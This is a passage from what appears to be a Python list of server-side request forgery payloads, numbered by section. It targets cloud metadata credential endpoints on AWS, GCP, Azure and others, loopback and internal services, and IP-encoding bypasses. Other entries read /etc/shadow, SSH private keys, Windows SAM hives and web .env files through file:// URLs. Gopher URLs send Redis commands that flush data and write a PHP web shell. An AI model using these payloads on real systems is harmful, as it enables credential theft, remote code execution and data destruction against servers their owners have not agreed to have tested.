        'http://169.254.169.254/latest/dynamic/instance-identity/document/',
        'http://169.254.169.254/latest/dynamic/instance-identity/pkcs7',
        'http://169.254.169.254/latest/dynamic/instance-identity/signature',
        'http://169.254.169.254/2018-09-24/',
        'http://169.254.169.254/2016-09-02/',
        'http://169.254.169.254/2014-11-05/',
        'http://169.254.169.254/2012-01-12/',
        'http://169.254.169.254/2009-04-04/',
        'http://169.254.169.254/2008-02-01/',
        'http://169.254.169.254/2007-01-19/',
        'http://169.254.169.254/2007-03-01/',
        'http://169.254.169.254/2007-08-29/',
        'http://169.254.169.254/2007-10-10/',
        
        # ==================== 51-100: GCP METADATA ====================
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://metadata.google.internal/computeMetadata/v1/instance/',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases',
        'http://metadata.google.internal/computeMetadata/v1/instance/attributes/',
        'http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys',
        'http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script',
        'http://metadata.google.internal/computeMetadata/v1/instance/attributes/user-data',
        'http://metadata.google.internal/computeMetadata/v1/instance/attributes/shutdown-script',
        'http://metadata.google.internal/computeMetadata/v1/instance/description',
        'http://metadata.google.internal/computeMetadata/v1/instance/hostname',
        'http://metadata.google.internal/computeMetadata/v1/instance/id',
        'http://metadata.google.internal/computeMetadata/v1/instance/image',
        'http://metadata.google.internal/computeMetadata/v1/instance/machine-type',
        'http://metadata.google.internal/computeMetadata/v1/instance/name',
        'http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/',
        'http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip',
        'http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/ip',
        'http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/mac',
        'http://metadata.google.internal/computeMetadata/v1/instance/preempted',
        'http://metadata.google.internal/computeMetadata/v1/instance/scheduling/preemptible',
        'http://metadata.google.internal/computeMetadata/v1/instance/tags',
        'http://metadata.google.internal/computeMetadata/v1/instance/zone',
        'http://metadata.google.internal/computeMetadata/v1/project/',
        'http://metadata.google.internal/computeMetadata/v1/project/project-id',
        'http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id',
        'http://metadata.google.internal/computeMetadata/v1/project/attributes/',
        'http://metadata.google.internal/computeMetadata/v1/project/attributes/google-compute-default-zone',
        'http://169.254.169.254/computeMetadata/v1/',
        'http://169.254.169.254/computeMetadata/v1/instance/',
        'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token',
        'http://169.254.169.254/computeMetadata/v1/instance/attributes/',
        'http://metadata.google.internal/computeMetadata/v1beta1/',
        'http://metadata.google.internal/computeMetadata/v1beta2/',
        'http://metadata.google.internal/computeMetadata/v1beta3/',
        'http://metadata.google.internal/computeMetadata/v1/?recursive=true',
        'http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/?recursive=true',
        'http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true',
        'http://metadata.google.internal/computeMetadata/v1/project/?recursive=true',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?alt=json',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?audience=test',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://example.com',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?format=full',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?format=standard',
        
        # ==================== 101-150: AZURE METADATA ====================
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance?api-version=2020-09-01',
        'http://169.254.169.254/metadata/instance?api-version=2019-08-15',
        'http://169.254.169.254/metadata/instance?api-version=2019-06-01',
        'http://169.254.169.254/metadata/instance?api-version=2019-04-30',
        'http://169.254.169.254/metadata/instance?api-version=2018-10-01',
        'http://169.254.169.254/metadata/instance?api-version=2018-04-02',
        'http://169.254.169.254/metadata/instance?api-version=2017-12-01',
        'http://169.254.169.254/metadata/instance?api-version=2017-08-01',
        'http://169.254.169.254/metadata/instance?api-version=2017-04-02',
        'http://169.254.169.254/metadata/instance?api-version=2017-03-01',
        'http://169.254.169.254/metadata/instance?api-version=2016-12-01',
        'http://169.254.169.254/metadata/instance?api-version=2016-04-01',
        'http://169.254.169.254/metadata/instance?api-version=2015-05-01',
        'http://169.254.169.254/metadata/instance?api-version=2014-12-01',
        'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/compute/vmSize?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/compute/zone?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/compute/plan?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/compute/platformUpdateDomain?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/compute/platformFaultDomain?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/network?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/network/interface/0/macAddress?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/privateIpAddress?api-version=2021-02-01',
        'http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2021-02-01',
        'http://169.254.169.254/metadata/network?api-version=2021-02-01',
        'http://169.254.169.254/metadata/loadbalancer?api-version=2021-02-01',
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/',
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net',
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com',
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://database.windows.net',
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://keyvault.azure.net',
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://servicebus.azure.net',
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-08-01&resource=https://management.azure.com/',
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=test',
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_secret=test',
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&tenantid=test',
        'http://169.254.169.254/metadata/instance/scheduledevents?api-version=2020-07-01',
        'http://169.254.169.254/metadata/attested/document?api-version=2018-10-01',
        'http://169.254.169.254/metadata/identity/info?api-version=2018-02-01',
        'http://168.63.129.16/machineid?api-version=2014-12-01',
        'http://168.63.129.16/?comp=metadata&format=json',
        'http://168.63.129.16/?comp=metadata&format=text',
        'http://168.63.129.16/?comp=metadata&format=xml',
        
        # ==================== 151-180: OTHER CLOUD PROVIDERS ====================
        'http://169.254.169.254/metadata/v1.json',
        'http://169.254.169.254/metadata/v1/id',
        'http://169.254.169.254/metadata/v1/hostname',
        'http://169.254.169.254/metadata/v1/region',
        'http://169.254.169.254/metadata/v1/tags',
        'http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address',
        'http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/gateway',
        'http://169.254.169.254/metadata/v1/dns/nameservers',
        'http://169.254.169.254/2009-04-04/meta-data/',
        'http://169.254.169.254/2009-04-04/user-data/',
        'http://192.0.0.192/latest/',
        'http://192.0.0.192/latest/meta-data/',
        'http://192.0.0.192/latest/user-data/',
        'http://192.0.0.192/latest/attributes/',
        'http://192.0.0.192/opc/v1/instance/',
        'http://192.0.0.192/opc/v1/instance/id',
        'http://192.0.0.192/opc/v1/instance/displayName',
        'http://192.0.0.192/opc/v1/instance/region',
        'http://192.0.0.192/opc/v1/instance/availabilityDomain',
        'http://192.0.0.192/opc/v1/instance/metadata/',
        'http://100.100.100.200/latest/meta-data/',
        'http://100.100.100.200/latest/user-data/',
        'http://100.100.100.200/latest/meta-data/instance-id',
        'http://100.100.100.200/latest/meta-data/region-id',
        'http://100.100.100.200/latest/meta-data/zone-id',
        'http://100.100.100.200/latest/meta-data/private-ipv4',
        'http://100.100.100.200/latest/meta-data/ram-disk',
        'http://100.100.100.200/latest/meta-data/serial-number',
        'http://100.100.100.200/latest/meta-data/source-address',
        'http://100.100.100.200/latest/meta-data/ntp-config',
        'http://100.100.100.200/latest/meta-data/owner-account-id',
        
        # ==================== 181-230: LOCALHOST & LOOPBACK ====================
        'http://127.0.0.1/',
        'http://127.0.0.1:80/',
        'http://127.0.0.1:443/',
        'http://127.0.0.1:8080/',
        'http://127.0.0.1:8081/',
        'http://127.0.0.1:8082/',
        'http://127.0.0.1:8000/',
        'http://127.0.0.1:8001/',
        'http://127.0.0.1:3000/',
        'http://127.0.0.1:3001/',
        'http://127.0.0.1:5000/',
        'http://127.0.0.1:5001/',
        'http://127.0.0.1:7000/',
        'http://127.0.0.1:7001/',
        'http://127.0.0.1:9000/',
        'http://127.0.0.1:9001/',
        'http://127.0.0.1:4000/',
        'http://127.0.0.1:4001/',
        'http://127.0.0.1:8888/',
        'http://127.0.0.1:8889/',
        'http://127.0.0.1:9999/',
        'http://127.0.0.1:10000/',
        'http://127.0.0.1:20000/',
        'http://127.0.0.1:6379/',
        'http://127.0.0.1:6379/info',
        'http://127.0.0.1:9200/',
        'http://127.0.0.1:9300/',
        'http://127.0.0.1:27017/',
        'http://127.0.0.1:5432/',
        'http://127.0.0.1:3306/',
        'http://127.0.0.1:11211/',
        'http://127.0.0.1:2181/',
        'http://127.0.0.1:9092/',
        'http://127.0.0.1:15672/',
        'http://127.0.0.1:5672/',
        'http://127.0.0.1:22/',
        'http://127.0.0.1:23/',
        'http://127.0.0.1:25/',
        'http://127.0.0.1:110/',
        'http://127.0.0.1:143/',
        'http://127.0.0.1:465/',
        'http://127.0.0.1:587/',
        'http://127.0.0.1:993/',
        'http://127.0.0.1:995/',
        'http://127.0.0.1:21/',
        'http://127.0.0.1:20/',
        'http://127.0.0.1:69/',
        'http://127.0.0.1:161/',
        'http://127.0.0.1:162/',
        'http://127.0.0.1:389/',
        'http://127.0.0.1:636/',
        'http://127.0.0.1:3268/',
        'http://127.0.0.1:3269/',
        'http://localhost/',
        'http://localhost:80/',
        'http://localhost:443/',
        'http://localhost:8080/',
        'http://localhost:3000/',
        'http://localhost:5000/',
        'http://localhost:8000/',
        'http://localhost:9000/',
        'http://localhost:8888/',
        'http://localhost:9999/',
        'http://0.0.0.0/',
        'http://0.0.0.0:80/',
        'http://0.0.0.0:8080/',
        'http://0.0.0.0:3000/',
        'http://0.0.0.0:5000/',
        'http://0.0.0.0:8000/',
        
        # ==================== 231-280: IP ADDRESS VARIATIONS ====================
        'http://[::1]/',
        'http://[::1]:80/',
        'http://[::1]:8080/',
        'http://[::1]:3000/',
        'http://[::ffff:127.0.0.1]/',
        'http://[::ffff:7f00:0001]/',
        'http://[::ffff:7f00:1]/',
        'http://[0:0:0:0:0:0:0:1]/',
        'http://0177.0.0.1/',
        'http://0177.0.0.1:80/',
        'http://0177.0000.0000.0001/',
        'http://0x7f000001/',
        'http://0x7f.0x00.0x00.0x01/',
        'http://0x7f000001:80/',
        'http://2130706433/',
        'http://2130706433:80/',
        'http://127.0.0.1.nip.io/',
        'http://127.0.0.1.xip.io/',
        'http://localhost.nip.io/',
        'http://0000:0000:0000:0000:0000:0000:0000:0001/',
        'http://0000:0000:0000:0000:0000:0000:7f00:0001/',
        'http://0x7f000001.nip.io/',
        'http://2130706433.nip.io/',
        'http://127.127.127.127/',
        'http://127.255.255.255/',
        'http://127.0.0.0/',
        'http://127.1.0.0/',
        'http://127.0.1.0/',
        'http://127.0.0.2/',
        'http://127.0.0.3/',
        'http://127.0.0.4/',
        'http://127.0.0.5/',
        'http://127.0.0.10/',
        'http://127.0.0.100/',
        'http://127.0.0.200/',
        'http://127.0.0.250/',
        'http://127.0.0.254/',
        'http://127.0.0.255/',
        'http://10.0.0.1/',
        'http://10.0.0.2/',
        'http://10.255.255.255/',
        'http://172.16.0.1/',
        'http://172.31.255.255/',
        'http://192.168.0.1/',
        'http://192.168.1.1/',
        'http://192.168.1.254/',
        'http://192.168.255.255/',
        'http://169.254.1.1/',
        'http://169.254.255.255/',
        'http://224.0.0.1/',
        'http://239.255.255.255/',
        
        # ==================== 281-330: DNS & SUBDOMAIN TRICKERY ====================
        'http://127.0.0.1.nip.io/',
        'http://127.0.0.2.nip.io/',
        'http://127.0.0.3.nip.io/',
        'http://localhost.nip.io/',
        'http://burpcollaborator.net/',
        'http://example.com/',
        'http://test.local/',
        'http://localhost.test/',
        'http://127.0.0.1.example.com/',
        'http://internal.local/',
        'http://intranet.local/',
        'http://admin.local/',
        'http://private.local/',
        'http://corp.local/',
        'http://company.local/',
        'http://internal.example.com/',
        'http://private.example.com/',
        'http://intra.example.com/',
        'http://vpn.example.com/',
        'http://dc.example.com/',
        'http://ad.example.com/',
        'http://ldap.example.com/',
        'http://redis.internal/',
        'http://mysql.internal/',
        'http://postgres.internal/',
        'http://mongodb.internal/',
        'http://elasticsearch.internal/',
        'http://rabbitmq.internal/',
        'http://kafka.internal/',
        'http://zookeeper.internal/',
        'http://consul.internal/',
        'http://etcd.internal/',
        'http://vault.internal/',
        'http://nomad.internal/',
        'http://kubernetes.internal/',
        'http://k8s.internal/',
        'http://docker.internal/',
        'http://registry.internal/',
        'http://jenkins.internal/',
        'http://gitlab.internal/',
        'http://github.internal/',
        'http://jira.internal/',
        'http://confluence.internal/',
        'http://nexus.internal/',
        'http://artifactory.internal/',
        'http://sonarqube.internal/',
        'http://prometheus.internal/',
        'http://grafana.internal/',
        'http://kibana.internal/',
        'http://logstash.internal/',
        
        # ==================== 331-380: FILE PROTOCOL ====================
        'file:///etc/passwd',
        'file:///etc/shadow',
        'file:///etc/hosts',
        'file:///etc/hostname',
        'file:///etc/issue',
        'file:///etc/issue.net',
        'file:///etc/motd',
        'file:///etc/resolv.conf',
        'file:///etc/fstab',
        'file:///etc/mtab',
        'file:///etc/crontab',
        'file:///etc/sudoers',
        'file:///etc/group',
        'file:///etc/gshadow',
        'file:///etc/passwd-',
        'file:///etc/shadow-',
        'file:///etc/ssh/sshd_config',
        'file:///etc/ssh/ssh_config',
        'file:///etc/ssh/ssh_host_rsa_key',
        'file:///etc/ssl/private/ssl-cert-snakeoil.key',
        'file:///root/.bashrc',
        'file:///root/.bash_history',
        'file:///root/.ssh/id_rsa',
        'file:///root/.ssh/authorized_keys',
        'file:///home/*/.bashrc',
        'file:///home/*/.bash_history',
        'file:///home/*/.ssh/id_rsa',
        'file:///var/log/apache2/access.log',
        'file:///var/log/apache2/error.log',
        'file:///var/log/nginx/access.log',
        'file:///var/log/nginx/error.log',
        'file:///var/log/auth.log',
        'file:///var/log/secure',
        'file:///var/log/syslog',
        'file:///var/log/messages',
        'file:///var/log/dpkg.log',
        'file:///var/log/apt/history.log',
        'file:///var/log/mysql/mysql.log',
        'file:///var/log/mysql/error.log',
        'file:///var/log/postgresql/postgresql.log',
        'file:///proc/self/environ',
        'file:///proc/self/cmdline',
        'file:///proc/self/status',
        'file:///proc/self/stat',
        'file:///proc/self/maps',
        'file:///proc/self/fd/0',
        'file:///proc/self/fd/1',
        'file:///proc/self/fd/2',
        'file:///proc/version',
        'file:///proc/cpuinfo',
        'file:///proc/meminfo',
        'file:///proc/uptime',
        'file:///proc/loadavg',
        'file:///proc/diskstats',
        'file:///proc/net/arp',
        'file:///proc/net/dev',
        'file:///proc/net/route',
        'file:///proc/net/tcp',
        'file:///proc/net/udp',
        'file:///proc/sys/kernel/hostname',
        'file:///proc/sys/kernel/domainname',
        'file:///proc/sys/kernel/osrelease',
        'file:///proc/sys/kernel/ostype',
        'file:///var/www/html/.env',
        'file:///var/www/html/wp-config.php',
        'file:///var/www/html/.htaccess',
        'file:///var/www/html/.htpasswd',
        'file:///var/www/html/config.php',
        'file:///var/www/html/configuration.php',
        'file:///var/www/html/settings.php',
        'file:///C:/windows/win.ini',
        'file:///C:/Windows/System32/drivers/etc/hosts',
        'file:///C:/Windows/System32/config/SAM',
        'file:///C:/Windows/System32/config/SYSTEM',
        'file:///C:/Windows/System32/config/SOFTWARE',
        'file:///C:/Windows/System32/config/SECURITY',
        'file:///C:/Windows/System32/config/DEFAULT',
        'file:///C:/boot.ini',
        'file:///C:/inetpub/wwwroot/web.config',
        'file:///C:/xampp/apache/conf/httpd.conf',
        'file:///C:/xampp/php/php.ini',
        'file:///C:/ProgramData/MySQL/MySQL Server/my.ini',
        'file:///C:/ProgramData/MySQL/MySQL Server/data/mysql/user.MYD',
        'file:///C:/Users/Administrator/NTUser.dat',
        'file:///C:/Documents and Settings/Administrator/NTUser.dat',
        
        # ==================== 381-430: GOPHER PROTOCOL ====================
        'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$4%0d%0ahack%0d%0a',
        'gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a',
        'gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a',
        'gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a',
        'gopher://127.0.0.1:6379/_*1%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$22%0d%0a<?php eval($_GET[cmd]);?>%0d%0a',
        'gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0asave%0d%0a',
        'gopher://127.0.0.1:6379/_*1%0d%0a$11%0d%0aflushall%0d%0a',
        'gopher://127.0.0.1:6379/_*2%0d%0a$3%0d%0adump%0d%0a$1%0d%0a1%0d%0a',
        'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a',
        'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0a%0a',
        'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0d%0a',
        'gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aecho%0d%0a$3%0d%0aabc%0d%0a',
        'gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM:%20test@test.com%0d%0aRCPT%20TO:%20victim@test.com%0d%0aDATA%0d%0aSubject:%20Test%0d%0a%0d%0aHello%0d%0a.%0d%0aQUIT%0d%0a',
        'gopher://127.0.0.1:25/_HELO%20localhost%0d%0aVRFY%20root%0d%0aQUIT%0d%0a',
        'gopher://127.0.0.1:25/_HELO%20localhost%0d%0aEXPN%20root%0d%0aQUIT%0d%0a',
        'gopher://127.0.0.1:110/_USER%20test%0d%0aPASS%20test%0d%0aQUIT%0d%0a',
        'gopher://127.0.0.1:143/_A001%20LOGIN%20test%20test%0d%0aA002%20LOGOUT%0d%0a',
        'gopher://127.0.0.1:21/_USER%20anonymous%0d%0aPASS%20test%0d%0aLIST%0d%0aQUIT%0d%0a',
        'gopher://127.0.0.1:22/_SSH-2.0-OpenSSH_7.4%0d%0a',
        'gopher://127.0.0.1:3306/_%00%00%00%01',
        'gopher://127.0.0.1:5432/_%00%00%00%08%04%00%00%00%00',
        'gopher://127.0.0.1:27017/_%00%00%00%00%00%00%00%00',
        'gopher://127.0.0.1:9200/_GET%20/%20HTTP/1.0%0d%0aHost:%20localhost%0d%0a%0d%0a',
        'gopher://127.0.0.1:9200/_GET%20/_cat/indices%20HTTP/1.0%0d%0aHost:%20localhost%0d%0a%0d%0a',
        'gopher://127.0.0.1:11211/_stats%0d%0a',
        'gopher://127.0.0.1:11211/_get%20key%0d%0a',
        'gopher://127.0.0.1:11211/_set%20key%200%200%204%0d%0atest%0d%0a',
        'gopher://127.0.0.1:2181/_envi%0d%0a',
        'gopher://127.0.0.1:2181/_stat%0d%0a',
        'gopher://127.0.0.1:2181/_get%20/znode%0d%0a',
        'gopher://127.0.0.1:9092/_%00%00%00%00%00%00%00%00%00%00%00%00%00%00',
        'gopher://127.0.0.1:15672/_GET%20/%20HTTP/1.0%0d%0aHost:%20localhost%0d%0a%0d%0a',
        'gopher://127.0.0.1:5672/_AMQP%00%00%09%01',
        'gopher://127.0.0.1:8080/_GET%20/%20HTTP/1.0%0d%0aHost:%20localhost%0d%0a%0d%0a',
        'gopher://127.0.0.1:8000/_GET%20/%20HTTP/1.0%0d%0aHost:%20localhost%0d%0a%0d%0a',
        'gopher://127.0.0.1:3000/_GET%20/%20HTTP/1.0%0d%0aHost:%20localhost%0d%0a%0d%0a',
        'gopher://127.0.0.1:5000/_GET%20/%20HTTP/1.0%0d%0aHost:%20localhost%0d%0a%0d%0a',
        'gopher://127.0.0.1:9000/_GET%20/%20HTTP/1.0%0d%0aHost:%20localhost%0d%0a%0d%0a',
        
        # ==================== 431-480: DICT PROTOCOL ====================
        'dict://127.0.0.1:6379/info',
        'dict://127.0.0.1:6379/config:get:*',
        'dict://127.0.0.1:6379/keys:*',
        'dict://127.0.0.1:6379/get:key',
        'dict://127.0.0.1:6379/set:key:value',
        'dict://127.0.0.1:6379/del:key',
        'dict://127.0.0.1:6379/flushall',
        'dict://127.0.0.1:6379/save',
        'dict://127.0.0.1:6379/bgsave',
        'dict://127.0.0.1:6379/dbsize',
        'dict://127.0.0.1:6379/time',
        'dict://127.0.0.1:6379/client:list',
        'dict://127.0.0.1:6379/ping',
        'dict://127.0.0.1:6379/echo:hello',
        'dict://127.0.0.1:6379/randomkey',
        'dict://127.0.0.1:6379/select:0',
        'dict://127.0.0.1:6379/swapdb:0:1',
        'dict://127.0.0.1:6379/monitor',
        'dict://127.0.0.1:25/HELO',
        'dict://127.0.0.1:25/HELO:localhost',
        'dict://127.0.0.1:25/MAIL:FROM:test@test.com',
        'dict://127.0.0.1:25/RCPT:TO:victim@test.com',
        'dict://127.0.0.1:25/DATA',
        'dict://127.0.0.1:25/QUIT',
        'dict://127.0.0.1:25/VRFY:root',
        'dict://127.0.0.1:25/EXPN:root',
        'dict://127.0.0.1:25/NOOP',
        'dict://127.0.0.1:25/RSET',
        'dict://127.0.0.1:25/HELP',
        'dict://127.0.0.1:110/USER:test',
        'dict://127.0.0.1:110/PASS:test',
        'dict://127.0.0.1:110/STAT',
        'dict://127.0.0.1:110/LIST',
        'dict://127.0.0.1:110/RETR:1',
        'dict://127.0.0.1:110/DELE:1',
        'dict://127.0.0.1:110/QUIT',
        'dict://127.0.0.1:143/A001:LOGIN:test:test',
        'dict://127.0.0.1:143/A002:LIST:""*',
        'dict://127.0.0.1:143/A003:SELECT:INBOX',
        'dict://127.0.0.1:143/A004:FETCH:1:ALL',
        'dict://127.0.0.1:143/A005:LOGOUT',
        'dict://127.0.0.1:21/USER:anonymous',
        'dict://127.0.0.1:21/PASS:test',
        'dict://127.0.0.1:21/PWD',
        'dict://127.0.0.1:21/LIST',
        'dict://127.0.0.1:21/RETR:file.txt',
        'dict://127.0.0.1:21/STOR:file.txt',
        'dict://127.0.0.1:21/DELE:file.txt',
        'dict://127.0.0.1:21/QUIT',
        
        # ==================== 481-530: INTERNAL SERVICES & PORTS ====================
        'http://127.0.0.1:9200/_cat/indices',
        'http://127.0.0.1:9200/_cat/nodes',
        'http://127.0.0.1:9200/_cat/health',
        'http://127.0.0.1:9200/_cluster/health',
        'http://127.0.0.1:9200/_cluster/state',
        'http://127.0.0.1:9200/_cluster/stats',
        'http://127.0.0.1:9200/_nodes',
        'http://127.0.0.1:9200/_nodes/stats',
        'http://127.0.0.1:9200/_all/_search',
        'http://127.0.0.1:9200/_search?q=*:*',
        'http://127.0.0.1:27017/_admin',
        'http://127.0.0.1:27017/test',
        'http://127.0.0.1:27017/serverStatus',
        'http://127.0.0.1:27017/listDatabases',
        'http://127.0.0.1:5432/',
        'http://127.0.0.1:5432/postgres',
        'http://127.0.0.1:5432/health',
        'http://127.0.0.1:3306/',
        'http://127.0.0.1:3306/health',
        'http://127.0.0.1:3306/status',
        'http://127.0.0.1:11211/',
        'http://127.0.0.1:11211/stats',
        'http://127.0.0.1:11211/slabs',
        'http://127.0.0.1:11211/items',
        'http://127.0.0.1:11211/cache',
        'http://127.0.0.1:2181/',
        'http://127.0.0.1:2181/health',
        'http://127.0.0.1:2181/status',
        'http://127.0.0.1:2181/zk',
        'http://127.0.0.1:2181/zookeeper',
        'http://127.0.0.1:9092/',
        'http://127.0.0.1:9092/health',
        'http://127.0.0.1:9092/status',
        'http://127.0.0.1:9092/brokers',
        'http://127.0.0.1:9092/topics',
        'http://127.0.0.1:15672/',
        'http://127.0.0.1:15672/api/overview',
        'http://127.0.0.1:15672/api/nodes',
        'http://127.0.0.1:15672/api/queues',
        'http://127.0.0.1:15672/api/exchanges',
        'http://127.0.0.1:15672/api/users',
        'http://127.0.0.1:15672/api/vhosts',
        'http://127.0.0.1:15672/api/connections',
        'http://127.0.0.1:15672/api/channels',
        'http://127.0.0.1:5672/',
        'http://127.0.0.1:5672/health',
        'http://127.0.0.1:5672/status',
        'http://127.0.0.1:5672/overview',
        'http://127.0.0.1:80/',
        'http://127.0.0.1:443/',
        'http://127.0.0.1:22/',
        'http://127.0.0.1:23/',
        'http://127.0.0.1:25/',
        'http://127.0.0.1:110/',
        'http://127.0.0.1:143/',
        'http://127.0.0.1:21/',
        'http://127.0.0.1:69/',
        'http://127.0.0.1:161/',
        'http://127.0.0.1:389/',
        'http://127.0.0.1:636/',
        'http://127.0.0.1:3268/',
        'http://127.0.0.1:3269/',
        
        # ==================== 531-580: URL ENCODED & VARIATIONS ====================
        'http://%31%32%37%2e%30%2e%30%2e%31/',
        'http://%31%32%37%2e%30%2e%30%2e%31:80/',
        'http://%31%32%37%2e%30%2e%30%2e%31:8080/',
        'http://%31%32%37%2e%30%2e%30%2e%31:3000/',
        'http://%31%32%37%2e%30%2e%30%2e%31:5000/',
        'http://%31%32%37%2e%30%2e%30%2e%31:8000/',
        'http://%31%32%37%2e%30%2e%30%2e%31:9000/',
        'http://%31%32%37%2e%30%2e%30%2e%31:6379/',
        'http://%31%32%37%2e%30%2e%30%2e%31:9200/',
        'http://%31%32%37%2e%30%2e%30%2e%31:27017/',
        'http://%31%32%37%2e%30%2e%30%2e%31:5432/',
        'http://%31%32%37%2e%30%2e%30%2e%31:3306/',
        'http://%31%32%37%2e%30%2e%30%2e%31:11211/',
        'http://%31%32%37%2e%30%2e%30%2e%31:2181/',
        'http://%31%32%37%2e%30%2e%30%2e%31:9092/',
        'http://%31%32%37%2e%30%2e%30%2e%31:15672/',
        'http://%31%32%37%2e%30%2e%30%2e%31:5672/',
        'http://%31%32%37%2e%30%2e%30%2e%31:25/',
        'http://%31%32%37%2e%30%2e%30%2e%31:110/',
        'http://%31%32%37%2e%30%2e%30%2e%31:143/',
        'http://%31%32%37%2e%30%2e%30%2e%31:21/',
        'http://%31%32%37%2e%30%2e%30%2e%31:22/',
        'http://%31%32%37%2e%30%2e%30%2e%31:23/',
        'http://%31%32%37%2e%30%2e%30%2e%31:69/',
        'http://%31%32%37%2e%30%2e%30%2e%31:161/',
        'http://%31%32%37%2e%30%2e%30%2e%31:389/',
        'http://%31%32%37%2e%30%2e%30%2e%31:636/',
        'http://%31%32%37%2e%30%2e%30%2e%31:3268/',
        'http://%31%32%37%2e%30%2e%30%2e%31:3269/',
        'http://%31%32%37%2e%30%2e%30%2e%31.nip.io/',
        'http://%31%32%37%2e%30%2e%30%2e%32/',
        'http://%31%32%37%2e%30%2e%30%2e%33/',
        'http://%31%32%37%2e%30%2e%30%2e%34/',
        'http://%31%32%37%2e%30%2e%30%2e%35/',
        'http://%31%32%37%2e%30%2e%30%2e%36/',
        'http://%31%32%37%2e%30%2e%30%2e%37/',
        'http://%31%32%37%2e%30%2e%30%2e%38/',
        'http://%31%32%37%2e%30%2e%30%2e%39/',
        'http://%31%32%37%2e%30%2e%30%2e%31%30/',
        'http://%31%32%37%2e%30%2e%30%2e%31%31/',
        'http://%31%32%37%2e%30%2e%30%2e%31%32/',
        'http://%31%32%37%2e%30%2e%30%2e%31%33/',
        'http://%31%32%37%2e%30%2e%30%2e%31%34/',
        'http://%31%32%37%2e%30%2e%30%2e%31%35/',
